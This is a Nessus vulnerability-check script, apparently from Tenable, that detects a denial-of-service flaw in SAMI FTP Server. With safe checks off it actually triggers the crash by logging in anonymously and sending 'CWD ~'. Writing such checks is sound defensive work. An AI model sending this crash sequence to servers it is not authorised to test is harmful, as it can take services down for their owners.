#Copyright (C) 2004 Tenable Network Security
#


if(description)
{
 script_id(12061);
 script_cve_id("CVE-2004-2081", "CVE-2004-2082");
 script_bugtraq_id(9657);
 script_version ("$Revision: 1.7 $");

 name["english"] = "SAMI FTP Server DoS";

 script_name(english:name["english"]);

 desc["english"] = "
The remote host is running SAMI FTP server.

There is a bug in the way this server handles certain FTP command 
requests which may allow an attacker to trigger a remote Denial of
Service (DoS) attack against the server.

See also : http://www.security-protocols.com/modules.php?name=News&file=article&sid=1746
Solution : Upgrade SAMI FTP server.
Risk factor : High";


 script_description(english:desc["english"]);


 script_summary(english:"SAMI Remote DoS");
 script_category(ACT_GATHER_INFO);
 script_family(english:"FTP");


 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");

 script_require_ports("Services/ftp", 21);
 script_dependencie("find_service.nes", "ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");

 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

banner = get_ftp_banner(port:port);
if ( ! banner ) exit(0);

# ok, so here's what it looks like:
#220-Sami FTP Server
#220-
#220 Features p a .
#User (f00dikator:(none)): anonymous
#230 Access allowed.
#ftp> cd ~
#Connection closed by remote host.

if( "Sami FTP Server" >< banner ) {
    if (safe_checks() == 0) { 
        req1 = string("USER anonymous\r\n");
        req2 = string("CWD ~\r\n");
        # SAMI ftp, when anonymous enabled, requires no password.... 
        soc=open_sock_tcp(port);
 	if ( ! soc ) exit(0);
        send(socket:soc, data:req1);    
        r = ftp_recv_line(socket:soc);
        if ( "Access allowed" >< r ) {
            send(socket:soc, data:req2 );
            r = recv_line(socket:soc, length:64, timeout:3);
	    close(soc);
            if (!r) security_hole(port);
        }
    } else {
        security_hole(port);
    }
}
